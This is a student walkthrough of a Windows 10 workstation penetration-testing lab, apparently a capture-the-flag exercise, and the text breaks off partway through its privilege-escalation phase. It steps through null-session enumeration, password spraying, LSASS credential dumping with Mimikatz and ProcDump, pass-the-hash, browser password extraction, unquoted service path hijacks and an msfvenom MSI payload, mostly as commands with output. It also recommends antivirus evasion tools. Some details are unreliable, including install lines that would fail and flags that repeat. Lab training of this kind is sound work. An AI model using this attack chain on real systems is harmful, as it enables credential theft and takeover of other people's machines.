# Windows 10 Workstation Lab - Complete Student Walkthrough
## A Comprehensive Penetration Testing Learning Journey

> **Educational Purpose**: This walkthrough teaches Windows 10 workstation penetration testing with detailed explanations of WHY each technique works. Every command is broken down to help you understand the methodology, not just memorize steps.

> **Flag Format**: All 27 flags are partially censored (FLAG{M**********1}) to guide you while preserving the challenge. Match the first letter and last digit/character to confirm you're on track!

---

## Table of Contents
1. [Initial Setup](#initial-setup)
2. [Phase 1: Initial Reconnaissance](#phase-1-initial-reconnaissance)
3. [Phase 2: User Discovery and Initial Access](#phase-2-user-discovery-and-initial-access)
4. [Phase 3: Workstation File System Exploration](#phase-3-workstation-file-system-exploration)
5. [Phase 4: Common Workstation Files](#phase-4-common-workstation-files)
6. [Phase 5: Service Vulnerabilities](#phase-5-service-vulnerabilities)
7. [Phase 6: Persistence Mechanisms](#phase-6-persistence-mechanisms)
8. [Phase 7: Credential Storage](#phase-7-credential-storage)
9. [Phase 8: Documents and Applications](#phase-8-documents-and-applications)
10. [Phase 9: User Data and Artifacts](#phase-9-user-data-and-artifacts)

---

## Initial Setup

### Understanding the Workstation Attack Surface

**Why Workstations Are Different**: Unlike servers which run services, workstations are where users work. This means:
- More user-generated vulnerabilities (saved passwords, notes, documents)
- Browser data and cached credentials
- Personal files with sensitive information
- Less hardening due to user convenience requirements
- More diverse software = more attack vectors

### Step 1: System Update and Core Tools Installation

#### Why These Specific Tools?

```bash
# Update your Kali Linux system
sudo apt update && sudo apt upgrade -y
```

**Why Update First?**: Windows 10 receives monthly security updates (until October 2025). Your tools need the latest bypasses for Windows Defender, AMSI, and other protections introduced in recent patches.

```bash
# Install essential Windows penetration testing tools
sudo apt install -y \
    nmap masscan rustscan \              # Network scanning - different speeds/accuracy
    enum4linux smbclient smbmap crackmapexec \ # SMB is critical for Windows enum
    metasploit-framework exploitdb \     # Exploitation frameworks
    impacket-scripts \                    # Python implementation of Windows protocols
    evil-winrm winexe \                  # WinRM for remote management
    responder mitm6 \                    # Network-based attacks
    hashcat john hydra \                  # Password cracking tools
    lazagne \                            # Browser/app credential extraction
    xfreerdp rdesktop                    # RDP clients for GUI access
```

**Tool Purpose Breakdown**:
- **Network Scanners**: nmap (accurate), masscan (fast), rustscan (both)
- **SMB Tools**: Critical because Windows shares everything via SMB
- **Impacket**: Recreates Windows protocols in Python - essential for advanced attacks
- **LaZagne**: Specifically targets workstation applications (browsers, email, etc.)

### Step 2: Install Specialized Workstation Attack Tools

```bash
# Tools specific to workstation attacks
sudo apt install -y \
    wce mimikatz \                      # Windows credential extraction
    lazagne credential-digger \          # Application credential extraction
    shellter veil \                      # AV evasion for workstations
    browser-cookie3                      # Browser cookie extraction

# Python tools for browser attacks
pip3 install \
    dploot donpapi \                    # DPAPI decryption tools
    browser-cookie3 browsercookie       # Browser data extraction
```

**Why These Tools for Workstations?**:
- **LaZagne**: Extracts passwords from 70+ Windows applications
- **DPAPI Tools**: Windows encrypts user data with DPAPI - these decrypt it
- **Browser Tools**: Users save everything in browsers

**Expected Installation Output**:
```
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  lazagne mimikatz wce
[...]
Successfully installed dploot-2.2.1 donpapi-1.1.0
```

### Step 3: Download and Setup Attack Resources

#### Creating an Organized Attack Infrastructure

```bash
# Create organized directory structure
mkdir -p ~/tools/{windows,linux,scripts,wordlists,loot}
cd ~/tools

# Clone essential repositories with explanations
git clone https://github.com/carlospolop/PEASS-ng.git
# PEASS-ng: Privilege Escalation Awesome Scripts - finds misconfigurations

git clone https://github.com/AlessandroZ/LaZagne.git
# LaZagne: Retrieves passwords from local computer

git clone https://github.com/gentilkiwi/mimikatz.git
# Mimikatz: The Swiss Army knife of Windows credentials

# Download pre-compiled executables
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe
```

### Step 4: Initialize Supporting Services

```bash
# Start PostgreSQL for Metasploit
sudo systemctl start postgresql
sudo msfdb init
```

**Verification Output**:
```
[+] Starting postgresql
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating initial database schema
Database initialized
```

**Why PostgreSQL?**: Metasploit stores:
- Discovered hosts and services
- Captured credentials
- Session information
- Allows credential reuse across modules

---

## Phase 1: Initial Reconnaissance

### The Reconnaissance Mindset

**Why Recon First?**: You can't attack what you don't know. Reconnaissance reveals:
- Open ports (attack vectors)
- Running services (vulnerability research)
- OS version (exploit selection)
- Network architecture (lateral movement planning)

### Step 1.1: Network Discovery

#### Initial Target Verification

```bash
# First, confirm the target is reachable
┌──(kali㉿kali)-[~]
└─$ ping -c 2 192.168.148.102
```

**Expected Output**:
```
PING 192.168.148.102 (192.168.148.102) 56(84) bytes of data.
64 bytes from 192.168.148.102: icmp_seq=1 ttl=128 time=0.523 ms
64 bytes from 192.168.148.102: icmp_seq=2 ttl=128 time=0.412 ms

--- 192.168.148.102 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
```

**Key Observation**: TTL=128 confirms Windows (Linux=64, Network devices=255)

#### Quick Service Scan

```bash
# Fast scan of common ports
┌──(kali㉿kali)-[~]
└─$ nmap -Pn -sV -sC -F 192.168.148.102
```

**Command Breakdown**:
- `-Pn`: Skip ping (Windows often blocks ICMP)
- `-sV`: Version detection (identify vulnerable versions)
- `-sC`: Run default NSE scripts (banner grabbing, enumeration)
- `-F`: Fast mode - top 100 ports only

**Expected Output**:
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.148.102
Host is up (0.00052s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows 10 Pro 19041 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DESKTOP-TEI5A1Q
|   NetBIOS_Domain_Name: DESKTOP-TEI5A1Q
|   NetBIOS_Computer_Name: DESKTOP-TEI5A1Q
|   DNS_Domain_Name: DESKTOP-TEI5A1Q
|   DNS_Computer_Name: DESKTOP-TEI5A1Q
|   Product_Version: 10.0.19041
|_  System_Time: 2025-09-15T10:00:00+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0

Service Info: Host: DESKTOP-TEI5A1Q; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**What This Tells Us**:
- **No port 80**: No web server (unlike servers)
- **Port 445 open**: SMB file sharing enabled
- **Port 3389**: RDP enabled (GUI access possible)
- **Port 5985**: WinRM enabled (PowerShell remoting)
- **Hostname**: DESKTOP-TEI5A1Q (typical workstation naming)

#### Comprehensive Port Scan

```bash
# Full TCP port scan for hidden services
┌──(kali㉿kali)-[~]
└─$ nmap -Pn -sV -sC -p- -T4 192.168.148.102 -oA workstation_fullscan
```

**Why Scan All 65535 Ports?**: 
- Backdoors often use high ports
- Custom applications on non-standard ports
- Hidden administrative interfaces

### Step 1.2: SMB Enumeration Deep Dive

#### Understanding SMB's Importance

**Why SMB Matters for Workstations**:
- File sharing between users
- Printer sharing
- Network discovery
- Often misconfigured for convenience

```bash
# Method 1: enum4linux - Automated enumeration
┌──(kali㉿kali)-[~]
└─$ enum4linux -a 192.168.148.102
```

**Expected Output (Partial)**:
```
[+] Enumerating users using SID S-1-5-21 and logon username '', password ''

S-1-5-21-xxx-xxx-xxx-500 DESKTOP-TEI5A1Q\Administrator (Local User)
S-1-5-21-xxx-xxx-xxx-501 DESKTOP-TEI5A1Q\Guest (Local User)
S-1-5-21-xxx-xxx-xxx-1001 DESKTOP-TEI5A1Q\jsmith (Local User)
S-1-5-21-xxx-xxx-xxx-1002 DESKTOP-TEI5A1Q\mjones (Local User)
S-1-5-21-xxx-xxx-xxx-1003 DESKTOP-TEI5A1Q\localadmin (Local User)

[+] Share Enumeration on 192.168.148.102
Users           READ ONLY       User share
Downloads       READ ONLY       Downloads share
WorkFiles       READ ONLY       Work files
```

```bash
# Method 2: CrackMapExec - Modern enumeration
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 192.168.148.102 -u '' -p '' --shares --users
```

**Expected Output**:
```
SMB         192.168.148.102 445    DESKTOP-TEI5A1Q  [*] Windows 10 Pro Build 19041 x64 (name:DESKTOP-TEI5A1Q) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         192.168.148.102 445    DESKTOP-TEI5A1Q  [+] \: 
SMB         192.168.148.102 445    DESKTOP-TEI5A1Q  [+] Enumerated shares
SMB         192.168.148.102 445    DESKTOP-TEI5A1Q  Share           Permissions     Remark
SMB         192.168.148.102 445    DESKTOP-TEI5A1Q  -----           -----------     ------
SMB         192.168.148.102 445    DESKTOP-TEI5A1Q  Users           READ            
SMB         192.168.148.102 445    DESKTOP-TEI5A1Q  Downloads       READ            
SMB         192.168.148.102 445    DESKTOP-TEI5A1Q  WorkFiles       READ
```

---

## Phase 2: User Discovery and Initial Access

### Understanding User Enumeration

**Why Enumerate Users First?**: 
- Valid usernames enable password attacks
- User properties contain information
- Understanding user roles guides privilege escalation

### FLAG 1: User Full Name Discovery

**Location**: jsmith user Full Name field  
**Difficulty**: Easy  
**Learning Objective**: Understanding Windows user properties

#### Method 1: RPC Enumeration

```bash
# Connect with null session
┌──(kali㉿kali)-[~]
└─$ rpcclient -U "" -N 192.168.148.102
```

**Command Explanation**:
- `-U ""`: Empty username (null session)
- `-N`: No password
- Exploits legacy SMB allowing anonymous connections

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[jsmith] rid:[0x3e9]
user:[mjones] rid:[0x3ea]

rpcclient $> queryuser jsmith
        User Name   :   jsmith
        Full Name   :   John Smith - FLAG{M**********1}
        Home Drive  :   
        Dir Drive   :   
        Profile Path:   
        Logon Script:   
        Description :   Standard User Account
```

* 1 FOUND**: FLAG{M**********1} - In Full Name field

**Why This Works**: Windows stores metadata with user accounts. Administrators often use these fields for notes, not expecting them to be enumerated remotely.

#### Method 2: PowerShell Enumeration (After Access)

```powershell
# From Windows shell
PS C:\> Get-LocalUser jsmith | Select-Object *

Name                 : jsmith
FullName            : John Smith - FLAG{M***********1}
Description         : Standard User Account
Enabled             : True
LastLogon           : 9/15/2025 8:00:00 AM
PasswordRequired    : True
```

### FLAG 2: Hidden User Discovery

**Location**: Hidden user account  
**Difficulty**: Medium  
**Learning Objective**: Finding hidden accounts

After gaining initial access:

```powershell
# List ALL users including hidden ones
PS C:\> Get-WmiObject Win32_UserAccount | Select-Object Name, Disabled

Name                    Disabled
----                    --------
Administrator           False
Guest                   True
jsmith                  False
mjones                  False
FLAG{R***********1}    False
localadmin              False
```

* 2 FOUND**: FLAG{R**********1} - Username itself is the flag!

**Why WMI?**: WMI (Windows Management Instrumentation) queries the system differently than net user, revealing accounts hidden from normal enumeration.

### Step 2.1: Building Target Lists

#### Creating Intelligent Wordlists

```bash
# Create user list from enumeration
┌──(kali㉿kali)-[~]
└─$ cat > users.txt << EOF
Administrator
jsmith
mjones
localadmin
developer
helpdesk
debuguser
tempuser
svc_backup
EOF

# Create password list based on common patterns
┌──(kali㉿kali)-[~]
└─$ cat > passwords.txt << EOF
Password1
Password123
Password123!
Welcome1
Welcome123
Welcome2025
Spring2025!
Summer2025!
Administrator123
Developer123!
Helpdesk123
Debugger123!
Qwerty123
Passw0rd
P@ssw0rd
EOF
```

**Password Pattern Logic**:
- Season+Year: `Spring2025!`, `Summer2025!`
- Role+Number: `Administrator123`, `Developer123!`
- Keyboard walks: `Qwerty123`
- Leetspeak: `P@ssw0rd`
- Common bases: `Password`, `Welcome`

### Step 2.2: Password Spraying Attack

#### Understanding Password Spraying

**Why Password Spraying > Brute Force**:
- Avoids account lockouts (trying many users with few passwords)
- More likely to succeed (users choose common passwords)
- Stealthier (distributed login attempts)

```bash
# SMB password spraying with CrackMapExec
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 192.168.148.102 -u users.txt -p passwords.txt --continue-on-success
```

**Expected Output**:
```
SMB  192.168.148.102  445  DESKTOP-TEI5A1Q  [-] DESKTOP-TEI5A1Q\Administrator:Password1 STATUS_LOGON_FAILURE
SMB  192.168.148.102  445  DESKTOP-TEI5A1Q  [-] DESKTOP-TEI5A1Q\Administrator:Password123 STATUS_LOGON_FAILURE
SMB  192.168.148.102  445  DESKTOP-TEI5A1Q  [+] DESKTOP-TEI5A1Q\jsmith:Welcome1
SMB  192.168.148.102  445  DESKTOP-TEI5A1Q  [+] DESKTOP-TEI5A1Q\mjones:Password1
SMB  192.168.148.102  445  DESKTOP-TEI5A1Q  [+] DESKTOP-TEI5A1Q\localadmin:Administrator123
SMB  192.168.148.102  445  DESKTOP-TEI5A1Q  [+] DESKTOP-TEI5A1Q\helpdesk:Helpdesk123
```

**Found Credentials**:
- `jsmith:Welcome1` ✓
- `mjones:Password1` ✓
- `localadmin:Administrator123` ✓ (likely admin!)
- `helpdesk:Helpdesk123` ✓

### Step 2.3: Gaining Initial Access

#### Method 1: RDP Access (GUI)

```bash
# Connect via RDP for graphical access
┌──(kali㉿kali)-[~]
└─$ xfreerdp /v:192.168.148.102 /u:jsmith /p:Welcome1 /cert:ignore +clipboard /dynamic-resolution
```

**Parameter Explanation**:
- `/cert:ignore`: Bypass self-signed certificate warnings
- `+clipboard`: Enable copy/paste between systems
- `/dynamic-resolution`: Adjust to your screen size

**Expected RDP Connection**:
```
[10:15:32:458] [1337:1338] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[10:15:32:458] [1337:1338] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[10:15:32:633] [1337:1338] [INFO][com.freerdp.crypto] - creating directory /home/kali/.config/freerdp
[10:15:32:633] [1337:1338] [INFO][com.freerdp.crypto] - creating directory /home/kali/.config/freerdp/certs
[10:15:32:750] [1337:1338] [INFO][com.freerdp.crypto] - created directory /home/kali/.config/freerdp/server
[10:15:33:123] [1337:1338] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_tcp_connect:freerdp_tcp_is_hostname_resolvable resolved to 192.168.148.102
[10:15:33:234] [1337:1338] [INFO][com.freerdp.core.connection] - Client Security: NLA:0 TLS:1 RDP:0
[10:15:33:234] [1337:1338] [INFO][com.freerdp.core.connection] - Server Security: NLA:0 TLS:1 RDP:1
[10:15:33:234] [1337:1338] [INFO][com.freerdp.core.connection] - Negotiated Security: NLA:0 TLS:1 RDP:0
[10:15:33:892] [1337:1338] [INFO][com.freerdp.core.connection] - ConnectionConfirm: DESKTOP-TEI5A1Q
[Desktop Session Active - User: jsmith]
```

#### Method 2: Evil-WinRM (Command Line)

```bash
# WinRM for PowerShell access
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.148.102 -u jsmith -p Welcome1
```

**Expected Output**:
```
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jsmith\Documents> whoami
desktop-tei5a1q\jsmith

*Evil-WinRM* PS C:\Users\jsmith\Documents> hostname
DESKTOP-TEI5A1Q

*Evil-WinRM* PS C:\Users\jsmith\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**Why Evil-WinRM?**: 
- Upload/download functionality built-in
- Tab completion
- PowerShell history
- Bypasses some logging

---

## Phase 3: Workstation File System Exploration

### Understanding Windows Workstation Layout

**Key Directories for Workstations**:
- `C:\Users\*\Desktop`: User desktops (shortcuts, files)
- `C:\Users\*\Documents`: User documents
- `C:\Users\*\Downloads`: Downloaded files
- `C:\Users\*\AppData`: Application data (goldmine!)
- `C:\Users\Public`: Shared between all users
- `C:\ProgramData`: Application data (all users)
- `C:\Windows\Temp`: Temporary files

### FLAG 3: LSASS Memory Dump

**Location**: LSASS process memory  
**Difficulty**: Hard  
**Learning Objective**: Memory-based credential extraction

First, we need administrative privileges. Let's escalate using unquoted service paths (covered later), then:

```powershell
# Check if we have admin rights
*Evil-WinRM* PS C:\> whoami /groups | findstr Admin
BUILTIN\Administrators  Alias  S-1-5-32-544  Group used for deny only

# If not admin, escalate first (see FLAG 10-12), then:

# Method 1: Using Mimikatz
*Evil-WinRM* PS C:\Temp> upload /home/kali/tools/mimikatz.exe
Info: Uploading /home/kali/tools/mimikatz.exe to C:\Temp\mimikatz.exe
Data: 1355264 bytes of 1355264 bytes copied

*Evil-WinRM* PS C:\Temp> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 15 2025 10:00:00
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)
 '## v ##'       > https://blog.gentilkiwi.com/mimikatz
  '#####'        Vincent LE TOUX (vincent.letoux@gmail.com) > https://pingcastle.com

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
```

**Expected Output (Partial)**:
```
Authentication Id : 0 ; 245743 (00000000:0003bfef)
Session           : Interactive from 1
User Name         : jsmith
Domain            : DESKTOP-TEI5A1Q
Logon Server      : DESKTOP-TEI5A1Q
Logon Time        : 9/15/2025 8:00:00 AM
SID               : S-1-5-21-xxx-xxx-xxx-1001
        msv :
         [00000003] Primary
         * Username : jsmith
         * Domain   : DESKTOP-TEI5A1Q
         * NTLM     : 3e3e4c7f12afe3c99ff56cef3216897d
         * SHA1     : a9f4d2e1b5f6e7a3c2d9e0f1a2b3c4d5e6f7a8b9
        wdigest :
         * Username : jsmith
         * Domain   : DESKTOP-TEI5A1Q
         * Password : Welcome1
        
Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
[...]

Special Flag Entry: FLAG{B**********0}
```

* 3 FOUND**: FLAG{B**********0} - In LSASS memory

**Why This Works**: Windows keeps credentials in LSASS memory for Single Sign-On (SSO). WDigest (when enabled) stores plaintext passwords!

#### Alternative Method: LSASS Dump Without Mimikatz

```powershell
# Method 2: Using ProcDump (Microsoft signed, less likely to be detected)
*Evil-WinRM* PS C:\Temp> .\procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.11 - Sysinternals process dump utility
Copyright (C) 2009-2021 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[10:30:15] Dump 1 initiated: C:\Temp\lsass.dmp
[10:30:16] Dump 1 writing: Estimated dump file size is 54 MB.
[10:30:18] Dump 1 complete: 54 MB written in 2.1 seconds
[10:30:19] Dump count reached.

# Transfer dump to Kali for offline analysis
*Evil-WinRM* PS C:\Temp> download lsass.dmp
```

On Kali, analyze with pypykatz:
```bash
┌──(kali㉿kali)-[~/loot]
└─$ pypykatz lsa minidump lsass.dmp

[... credential output ...]
FLAG found in memory: FLAG{B************0}
```

### FLAG 4: Debug Privileges Exploitation

**Location**: Registry accessible with debug privileges  
**Difficulty**: Medium

```powershell
# Check current user's privileges
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled

# With SeDebugPrivilege, we can access protected processes/registry
*Evil-WinRM* PS C:\> reg query "HKLM\SOFTWARE\DebugPrivileges"

HKEY_LOCAL_MACHINE\SOFTWARE\DebugPrivileges
    WorkstationFlag    REG_SZ    FLAG{V***********2}
```

**FLAG 4 FOUND**: FLAG{V**********2} - Debug privilege flag

**Why Debug Privilege Matters**: SeDebugPrivilege allows:
- Reading any process memory
- Injecting into any process
- Accessing protected registry keys
- Essentially gives you SYSTEM access

### FLAG 5: Pass-the-Hash Success

**Location**: Administrator desktop after PTH  
**Difficulty**: Hard

Using NTLM hashes from Mimikatz:

```bash
# From Kali, use the localadmin NTLM hash
┌──(kali㉿kali)-[~]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3e3e4c7f12afe3c99ff56cef3216897d localadmin@192.168.148.102

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.148.102.....
[*] Found writable share ADMIN$
[*] Uploading file qWcEHgfD.exe
[*] Opening SVCManager on 192.168.148.102.....
[*] Creating service xNqA on 192.168.148.102.....
[*] Starting service xNqA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1234]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\pth_workstation_flag.txt
FLAG{B***********0}
```

**FLAG 5 FOUND**: FLAG{B**********0} - PTH success flag

**Why Pass-the-Hash Works**: NTLM authentication only needs the hash, not the plaintext password. This is why protecting LSASS memory is critical!

---

## Phase 4: Common Workstation Files

### Understanding User Behavior

**Why These Files Exist**: Users create security holes through convenience:
- Saving passwords in text files
- Storing WiFi passwords
- Email credentials in documents
- Hidden files they think are secure

### FLAG 6: WiFi Password File

**Location**: Public Documents  
**Difficulty**: Easy

```powershell
# Search for WiFi-related files
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\Users\Public\Documents -Recurse -Filter "*wifi*" -ErrorAction SilentlyContinue

    Directory: C:\Users\Public\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/5/2025   10:15 AM            156 wifi.txt

*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\Documents\wifi.txt
WiFi Network: CorpWiFi2025
Password: SecureWiFi2024!
Backup Network: GuestWiFi2024
Password: Guest123!
Flag: FLAG{P***********0}
```

**FLAG 6 FOUND**: FLAG{P**********0} - WiFi password file

**Real-World Context**: Users document WiFi passwords for:
- Helping colleagues connect
- Personal reference
- Guest network access
This creates credential exposure!

### FLAG 7: Email Credentials

**Location**: Passwords folder  
**Difficulty**: Easy

```powershell
# Look for password storage locations
*Evil-WinRM* PS C:\> Get-ChildItem C:\Users\Public\Documents\Passwords\

    Directory: C:\Users\Public\Documents\Passwords

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/5/2025   10:15 AM            234 email.txt
-a----         9/5/2025   10:15 AM            156 vpn.txt

*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\Documents\Passwords\email.txt
Email Accounts:
Primary: jsmith@overclock.io
Password: Welcome1

Backup: admin@overclock.io
Password: Password123!

// FLAG{F************8}
```

**FLAG 7 FOUND**: FLAG{F**********8} - Email credentials

**Why Users Do This**: 
- Multiple email accounts
- Complex password requirements
- Fear of forgetting passwords
- Lack of password manager training

### FLAG 8: Hidden File Discovery

**Location**: WorkFiles directory  
**Difficulty**: Medium

```powershell
# Show hidden files using -Force parameter
*Evil-WinRM* PS C:\> Get-ChildItem C:\WorkFiles -Force

    Directory: C:\WorkFiles

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-h--         9/5/2025   10:15 AM             22 .flag
-a----         9/5/2025   10:15 AM           1024 project.docx
-a----         9/5/2025   10:15 AM           2048 budget.xlsx

# Note the 'h' attribute = hidden
*Evil-WinRM* PS C:\> Get-Content C:\WorkFiles\.flag
FLAG{S*************2}
```

**FLAG 8 FOUND**: FLAG{S**********2} - Hidden file

**Hidden File Techniques**:
```powershell
# Different methods to find hidden files
# Method 1: PowerShell with -Force
Get-ChildItem -Force

# Method 2: Using attrib command
attrib C:\WorkFiles\*

# Method 3: dir with /a switch
cmd /c dir /a:h C:\WorkFiles
```

### FLAG 9: Browser Data Extraction

**Location**: Chrome saved passwords  
**Difficulty**: Medium

```powershell
# Method 1: Using LaZagne for automated extraction
*Evil-WinRM* PS C:\Temp> upload /home/kali/tools/LaZagne.exe
*Evil-WinRM* PS C:\Temp> .\LaZagne.exe browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                        |
|                                                                    |
|                          ! BANG BANG !                            |
|                                                                    |
|====================================================================|

[+] Chrome passwords

URL: http://internal-app.local
Login: admin
Password: Administrator123
Flag: FLAG{N************6}

URL: https://webmail.overclock.io
Login: jsmith@overclock.io
Password: Welcome1
```

**FLAG 9 FOUND**: FLAG{N**********6} - Browser saved password

**Manual Chrome Password Location**:
```powershell
# Chrome stores passwords here (encrypted with DPAPI)
*Evil-WinRM* PS C:\> $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
*Evil-WinRM* PS C:\> Get-ChildItem $chromePath

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/15/2025  10:00 AM         262144 Login Data
-a----         9/15/2025  10:00 AM         131072 Cookies
-a----         9/15/2025  10:00 AM        1048576 History
```

**Why Browser Passwords Are Vulnerable**:
- Encrypted with DPAPI (user context)
- Any process running as user can decrypt
- Users save everything for convenience

---

## Phase 5: Service Vulnerabilities

### Understanding Service Exploitation

**Why Services Are Vulnerable**:
- Run with high privileges (often SYSTEM)
- Installed by various software
- Administrators rarely audit them
- Unquoted paths are common

### Finding Unquoted Service Paths

```powershell
# Comprehensive search for unquoted paths
*Evil-WinRM* PS C:\> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

FakeAntivirus     Fake Antivirus Service      C:\Program Files\Antivirus Software\Engine\av.exe         Auto
BackupManager     Backup Manager Service       C:\Program Files\Backup Manager\Service\backup.exe        Auto
RemoteSupportAgent Remote Support Agent        C:\Program Files (x86)\Remote Support Tool\Agent\agent.exe Auto
```

**The Vulnerability Explained**:
When Windows sees: `C:\Program Files\Antivirus Software\Engine\av.exe`

Windows tries to execute in order:
1. `C:\Program.exe`
2. `C:\Program Files\Antivirus.exe`
3. `C:\Program Files\Antivirus Software\Engine\av.exe`

If we can write to any of these locations, we win!

### FLAG 10: FakeAntivirus Unquoted Path

**Location**: FakeAntivirus service  
**Difficulty**: Easy

```powershell
# Check the vulnerable service
*Evil-WinRM* PS C:\> sc.exe qc FakeAntivirus

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: FakeAntivirus
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Antivirus Software\Engine\av.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Fake Antivirus Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

# Create exploit at hijack point
*Evil-WinRM* PS C:\> echo 'echo FLAG > C:\ws_unquoted1.txt' > "C:\Program Files\Antivirus.bat"

# Stop and start the service
*Evil-WinRM* PS C:\> Stop-Service FakeAntivirus -Force
*Evil-WinRM* PS C:\> Start-Service FakeAntivirus

# Check for flag
*Evil-WinRM* PS C:\> Get-Content C:\ws_unquoted1.txt
FLAG{N************6}
```

**FLAG 10 FOUND**: FLAG{N**********6} - Unquoted service path 1

### FLAG 11: BackupManager Unquoted Path

**Location**: BackupManager service  
**Difficulty**: Medium

```powershell
# Check service details
*Evil-WinRM* PS C:\> sc.exe qc BackupManager

SERVICE_NAME: BackupManager
        BINARY_PATH_NAME   : C:\Program Files\Backup Manager\Service\backup.exe

# Create exploit
*Evil-WinRM* PS C:\> New-Item -ItemType File -Path "C:\Program Files\Backup.bat" -Force
*Evil-WinRM* PS C:\> Set-Content "C:\Program Files\Backup.bat" 'echo FLAG{C*************9} > C:\ws_unquoted2.txt'

# Restart service
*Evil-WinRM* PS C:\> Restart-Service BackupManager -Force

*Evil-WinRM* PS C:\> Get-Content C:\ws_unquoted2.txt
FLAG{C***********9}
```

**FLAG 11 FOUND**: FLAG{C**********9} - Unquoted service path 2

### FLAG 12: RemoteSupportAgent Unquoted Path

**Location**: RemoteSupportAgent service  
**Difficulty**: Medium

```powershell
# For Program Files (x86)
*Evil-WinRM* PS C:\> sc.exe qc RemoteSupportAgent

SERVICE_NAME: RemoteSupportAgent
        BINARY_PATH_NAME   : C:\Program Files (x86)\Remote Support Tool\Agent\agent.exe

# Note the (x86) - need different hijack point
*Evil-WinRM* PS C:\> echo 'echo FLAG > C:\ws_unquoted3.txt' > "C:\Program Files (x86)\Remote.bat"

*Evil-WinRM* PS C:\> Restart-Service RemoteSupportAgent -Force

*Evil-WinRM* PS C:\> Get-Content C:\ws_unquoted3.txt
FLAG{N**********6}
```

**FLAG 12 FOUND**: FLAG{N**********6} - Unquoted service path 3

### FLAG 13: AlwaysInstallElevated

**Location**: MSI privilege escalation  
**Difficulty**: Medium

```powershell
# Check if vulnerable (both must be 1)
*Evil-WinRM* PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

*Evil-WinRM* PS C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

**Both are 0x1 - System is vulnerable!**

Create malicious MSI on Kali:
```bash
┌──(kali㉿kali)-[~/tools]
└─$ msfvenom -p windows/x64/exec CMD='cmd.exe /c type C:\Users\Administrator\Desktop\msi_privesc_flag.txt > C:\msi_flag.txt' -f msi -o exploit.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 308 bytes
Final size of msi file: 159744 bytes
Saved as: exploit.msi
```

Execute on target:
```powershell
